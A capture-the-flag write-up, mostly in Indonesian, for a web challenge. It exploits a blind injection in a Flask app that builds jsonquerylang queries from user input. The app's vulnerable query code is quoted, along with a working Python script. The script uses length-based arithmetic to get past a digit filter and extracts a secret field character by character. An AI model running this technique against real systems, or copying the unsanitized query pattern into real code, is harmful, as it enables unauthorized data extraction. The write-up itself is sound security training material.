# Kaito CTF - The Jackal's Alias

- Write-Up Author: reybong
- Category: Web
- Flag: `Kaito{bl1nd_j50nqu3ry_byp455_v14_b00l34n_4r1thm3t1c}`

## Challenge Description

> Uncover the secret year metadata associated with the alias of The Jackal from the JSON Query interface.

**Target URL:** `https://the-jackals-alias.instance.tbf1.online/`

## Analisis

Aplikasi Flask menggunakan `jsonquerylang` untuk memproses input nama pengguna tanpa sanitasi/escaping pada fungsi `count_records()`:

```python
query = f"""
    .collection
        | filter(.Name == "{name}" and .Year == "{year}")
        | pick(.Count)
        | map(values())
        | flatten()
        | map(number(get()))
        | sum()
"""
```

Input `name` memungkinkan **Boolean-based Blind JQL Injection**.

Terdapat proteksi `contains_digit()` yang menolak karakter angka `0-9` literal pada input `name`. Proteksi ini di-bypass dengan kombinasi operator JQL:
1. Mengukur panjang string dummy untuk indeks numerik: `"AAA" | size()` $\rightarrow$ `3`.
2. Mengubah nilai numerik menjadi string digit untuk perbandingan karakter: `string("AAA" | size())` $\rightarrow$ `"3"`.

Payload dibentuk tanpa angka literal untuk mengekstrak string flag pada field `.Year` secara bertahap.

## Langkah Menemukan Flag

1. Susun payload injeksi `substring(.Year, "A"*pos | size(), "A"*(pos+1) | size()) == <rhs>`.
2. Kirimkan HTTP GET request ke `/` dengan parameter `name` berisikan payload injeksi.
3. Evaluasi respon server (`resultado-box`) untuk mendeteksi kebenaran karakter.
4. Ulangi proses hingga seluruh string flag terekstrak.

Script otomatisasi eksploitasi (`solve.py`):

```python
import requests, string, urllib3
urllib3.disable_warnings()

TARGET_URL = "https://the-jackals-alias.instance.tbf1.online/"
session = requests.Session()
CHARSET = string.ascii_letters + string.digits + "{}_-!"

def build_char_test(alias: str, pos: int, char: str) -> str:
    pos_s = "A" * pos
    pos_s1 = "A" * (pos + 1)
    if char.isdigit():
        d_s = "A" * int(char)
        rhs = f'string("{d_s}" | size())'
    else:
        esc = '\\"' if char == '"' else char
        rhs = f'"{esc}"'
    return f'dummy" or (.Name == "{alias}" and substring(.Year, "{pos_s}" | size(), "{pos_s1}" | size()) == {rhs}) or .Name == "dummy'

def extract_flag(alias="Charles Calthrop"):
    extracted = ""
    for _ in range(80):
        pos = len(extracted)
        for c in CHARSET:
            payload = build_char_test(alias, pos, c)
            r = session.get(TARGET_URL, params={"name": payload, "year": 2000}, verify=False)
            if "resultado-box" in r.text and '<span class="result-count">0</span>' not in r.text:
                extracted += c
                print(f"[+] {extracted}")
                if c == "}":
                    return extracted
                break
    return extracted

if __name__ == "__main__":
    print(f"FLAG: {extract_flag()}")
```

Jalankan eksploitasi dengan perintah:
```bash
python solve.py
```

**Flag:** `Kaito{bl1nd_j50nqu3ry_byp455_v14_b00l34n_4r1thm3t1c}`
